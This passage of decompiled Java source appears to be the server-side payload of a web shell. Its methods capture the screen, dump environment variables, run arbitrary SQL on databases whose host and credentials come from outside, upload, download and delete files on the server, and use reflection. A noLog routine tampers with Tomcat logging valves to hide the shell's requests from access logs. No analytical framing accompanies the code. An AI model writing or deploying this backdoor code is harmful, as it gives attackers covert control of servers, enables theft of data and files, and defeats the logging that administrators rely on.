                for (Object key2 : envMap.keySet()) {
                    basicsInfo3 = new StringBuffer(String.valueOf(basicsInfo3)).append(key2).append(" : ").append(envMap.get(key2)).append("\n").toString();
                }
            }
            return basicsInfo3.getBytes();
        } catch (Exception e3) {
            return e3.getMessage().getBytes();
        }
    }

    public byte[] screen() {
        try {
            Robot robot = new Robot();
            BufferedImage as = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
            ByteArrayOutputStream bs = new ByteArrayOutputStream();
            ImageIO.write(as, "png", ImageIO.createImageOutputStream(bs));
            byte[] data = bs.toByteArray();
            bs.close();
            return data;
        } catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public byte[] execSql() throws Exception {
        String charset = get("dbCharset");
        String dbType = get("dbType");
        String dbHost = get("dbHost");
        String dbPort = get("dbPort");
        String dbUsername = get("dbUsername");
        String dbPassword = get("dbPassword");
        String execType = get("execType");
        String execSql = new String(getByteArray("execSql"), charset);
        if (dbType != null && dbHost != null && dbPort != null && dbUsername != null && dbPassword != null && execType != null && execSql != null) {
            try {
                try {
                    Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                } catch (Exception e) {
                    return e.getMessage().getBytes();
                }
            } catch (Exception e2) {
            }
            try {
                Class.forName("oracle.jdbc.driver.OracleDriver");
            } catch (Exception e3) {
                try {
                    Class.forName("oracle.jdbc.OracleDriver");
                } catch (Exception e4) {
                }
            }
            try {
                Class.forName("com.mysql.cj.jdbc.Driver");
            } catch (Exception e5) {
                try {
                    Class.forName("com.mysql.jdbc.Driver");
                } catch (Exception e6) {
                }
            }
            try {
                Class.forName("org.postgresql.Driver");
            } catch (Exception e7) {
            }
            try {
                Class.forName("org.sqlite.JDBC");
            } catch (Exception e8) {
            }
            String connectUrl = null;
            if ("mysql".equals(dbType)) {
                connectUrl = new StringBuffer("jdbc:mysql://").append(dbHost).append(":").append(dbPort).append("/").append("?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&noDatetimeStringSync=true&characterEncoding=utf-8").toString();
            } else if ("oracle".equals(dbType)) {
                connectUrl = new StringBuffer("jdbc:oracle:thin:@").append(dbHost).append(":").append(dbPort).append(":orcl").toString();
            } else if ("sqlserver".equals(dbType)) {
                connectUrl = new StringBuffer("jdbc:sqlserver://").append(dbHost).append(":").append(dbPort).append(";").toString();
            } else if ("postgresql".equals(dbType)) {
                connectUrl = new StringBuffer("jdbc:postgresql://").append(dbHost).append(":").append(dbPort).append("/").toString();
            } else if ("sqlite".equals(dbType)) {
                connectUrl = new StringBuffer("jdbc:sqlite:").append(dbHost).toString();
            }
            if (dbHost.indexOf("jdbc:") != -1) {
                connectUrl = dbHost;
            }
            if (connectUrl != null) {
                Connection dbConn = null;
                try {
                    try {
                        dbConn = getConnection(connectUrl, dbUsername, dbPassword);
                    } catch (Exception e9) {
                        return e9.getMessage().getBytes();
                    }
                } catch (Exception e10) {
                }
                if (dbConn == null) {
                    dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
                }
                Statement statement = dbConn.createStatement();
                if (execType.equals("select")) {
                    String data = "ok\n";
                    ResultSet resultSet = statement.executeQuery(execSql);
                    ResultSetMetaData metaData = resultSet.getMetaData();
                    int columnNum = metaData.getColumnCount();
                    for (int i = 0; i < columnNum; i++) {
                        data = new StringBuffer(String.valueOf(data)).append(base64Encode(String.format("%s", metaData.getColumnName(i + 1)))).append("\t").toString();
                    }
                    String data2 = new StringBuffer(String.valueOf(data)).append("\n").toString();
                    while (resultSet.next()) {
                        for (int i2 = 0; i2 < columnNum; i2++) {
                            data2 = new StringBuffer(String.valueOf(data2)).append(base64Encode(String.format("%s", resultSet.getString(i2 + 1)))).append("\t").toString();
                        }
                        data2 = new StringBuffer(String.valueOf(data2)).append("\n").toString();
                    }
                    resultSet.close();
                    statement.close();
                    dbConn.close();
                    return data2.getBytes();
                }
                int affectedNum = statement.executeUpdate(execSql);
                statement.close();
                dbConn.close();
                return new StringBuffer("Query OK, ").append(affectedNum).append(" rows affected").toString().getBytes();
            }
            return new StringBuffer("no ").append(dbType).append(" Dbtype").toString().getBytes();
        }
        return "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql".getBytes();
    }

    public byte[] close() {
        try {
            if (this.httpSession != null) {
                getMethodAndInvoke(this.httpSession, "invalidate", null, null);
            }
            return "ok".getBytes();
        } catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public byte[] bigFileUpload() {
        String fileName = get("fileName");
        byte[] fileContents = getByteArray("fileContents");
        String position = get("position");
        try {
            if (position == null) {
                FileOutputStream fileOutputStream = new FileOutputStream(fileName, true);
                fileOutputStream.write(fileContents);
                fileOutputStream.flush();
                fileOutputStream.close();
            } else {
                RandomAccessFile fileOutputStream2 = new RandomAccessFile(fileName, "rw");
                fileOutputStream2.seek(Integer.parseInt(position));
                fileOutputStream2.write(fileContents);
                fileOutputStream2.close();
            }
            return "ok".getBytes();
        } catch (Exception e) {
            return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
        }
    }

    public byte[] bigFileDownload() {
        String fileName = get("fileName");
        String mode = get("mode");
        String readByteNumString = get("readByteNum");
        String positionString = get("position");
        try {
            if ("fileSize".equals(mode)) {
                return String.valueOf(new File(fileName).length()).getBytes();
            }
            if ("read".equals(mode)) {
                int position = Integer.valueOf(positionString).intValue();
                int readByteNum = Integer.valueOf(readByteNumString).intValue();
                byte[] readData = new byte[readByteNum];
                FileInputStream fileInputStream = new FileInputStream(fileName);
                fileInputStream.skip(position);
                int readNum = fileInputStream.read(readData);
                fileInputStream.close();
                if (readNum == readData.length) {
                    return readData;
                }
                return copyOf(readData, readNum);
            }
            return "no mode".getBytes();
        } catch (Exception e) {
            return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
        }
    }

    public Map getEnv() {
        try {
            int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
            if (jreVersion >= 5) {
                try {
                    Class<?> cls = class$6;
                    if (cls == null) {
                        try {
                            cls = Class.forName("java.lang.System");
                            class$6 = cls;
                        } catch (ClassNotFoundException unused) {
                            throw new NoClassDefFoundError(unused.getMessage());
                        }
                    }
                    Method method = cls.getMethod("getenv", new Class[0]);
                    Class<?> returnType = method.getReturnType();
                    if (method == null) {
                        return null;
                    }
                    Class<?> cls2 = class$7;
                    if (cls2 == null) {
                        try {
                            cls2 = Class.forName("java.util.Map");
                            class$7 = cls2;
                        } catch (ClassNotFoundException unused2) {
                            throw new NoClassDefFoundError(unused2.getMessage());
                        }
                    }
                    if (returnType.isAssignableFrom(cls2)) {
                        return (Map) method.invoke(null);
                    }
                    return null;
                } catch (Exception e) {
                    return null;
                }
            }
            return null;
        } catch (Exception e2) {
            return null;
        }
    }

    public String getDocBase() {
        try {
            return getRealPath();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    public String getRealPath() {
        try {
            if (this.servletContext != null) {
                Class<?> cls = this.servletContext.getClass();
                Class[] clsArr = new Class[1];
                Class<?> cls2 = class$2;
                if (cls2 == null) {
                    try {
                        cls2 = Class.forName("java.lang.String");
                        class$2 = cls2;
                    } catch (ClassNotFoundException unused) {
                        throw new NoClassDefFoundError(unused.getMessage());
                    }
                }
                clsArr[0] = cls2;
                Method getRealPathMethod = getMethodByClass(cls, "getRealPath", clsArr);
                if (getRealPathMethod != null) {
                    Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
                    if (retObject != null) {
                        return retObject.toString();
                    }
                    return "Null";
                }
                return "no method getRealPathMethod";
            }
            return "servletContext is Null";
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    public void deleteFiles(File f2) throws Exception {
        if (f2.isDirectory()) {
            File[] x2 = f2.listFiles();
            for (File fs : x2) {
                deleteFiles(fs);
            }
        }
        f2.delete();
    }

    Object invoke(Object obj, String methodName, Object[] parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (Object o1 : parameters) {
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                }
            }
            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception e) {
            return null;
        }
    }

    Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null) {
                return method.invoke(obj, parameters);
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    private void noLog(Object servletContext) {
        try {
            Object applicationContext = getFieldValue(servletContext, "context");
            Object container = getFieldValue(applicationContext, "context");
            ArrayList arrayList = new ArrayList();
            while (container != null) {
                arrayList.add(container);
                container = invoke(container, "getParent", null);
            }
            for (int i = 0; i < arrayList.size(); i++) {
                try {
                    Object pipeline = invoke(arrayList.get(i), "getPipeline", null);
                    if (pipeline != null) {
                        Object valve = invoke(pipeline, "getFirst", null);
                        while (valve != null) {
                            if (getMethodByClass(valve.getClass(), "getCondition", null) != null) {
                                Class<?> cls = valve.getClass();
                                Class[] clsArr = new Class[1];
                                Class<?> cls2 = class$2;
                                if (cls2 == null) {
                                    try {
                                        cls2 = Class.forName("java.lang.String");
                                        class$2 = cls2;
                                    } catch (ClassNotFoundException unused) {
                                        throw new NoClassDefFoundError(unused.getMessage());
                                    }
                                }
                                clsArr[0] = cls2;
                                if (getMethodByClass(cls, "setCondition", clsArr) != null) {
                                    String condition = (String) invoke((String) valve, "getCondition", new Object[0]);
                                    String condition2 = condition == null ? "FuckLog" : condition;
                                    invoke(valve, "setCondition", new Object[]{condition2});
                                    Class<?> cls3 = this.servletRequest.getClass();
                                    Class[] clsArr2 = new Class[2];
                                    Class<?> cls4 = class$2;
                                    if (cls4 == null) {
                                        try {
                                            cls4 = Class.forName("java.lang.String");
                                            class$2 = cls4;
                                        } catch (ClassNotFoundException unused2) {
                                            throw new NoClassDefFoundError(unused2.getMessage());
                                        }
                                    }
                                    clsArr2[0] = cls4;
                                    Class<?> cls5 = class$2;
                                    if (cls5 == null) {
                                        try {
                                            cls5 = Class.forName("java.lang.String");
                                            class$2 = cls5;
                                        } catch (ClassNotFoundException unused3) {
                                            throw new NoClassDefFoundError(unused3.getMessage());
                                        }
                                    }
                                    clsArr2[1] = cls5;
                                    Method setAttributeMethod = getMethodByClass(cls3, "setAttribute", clsArr2);
                                    setAttributeMethod.invoke(condition2, condition2);
                                    valve = invoke(valve, "getNext", null);
                                }
                            }
                            if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                valve = invoke(valve, "getNext", null);
                            } else {
                                valve = null;
                            }
                        }
                    } else {
                        continue;
                    }
                } catch (Exception e) {
                }
            }
        } catch (Exception e2) {
        }
    }

    public String base64Encode(String data) {
        return base64Encode(data.getBytes());
    }
}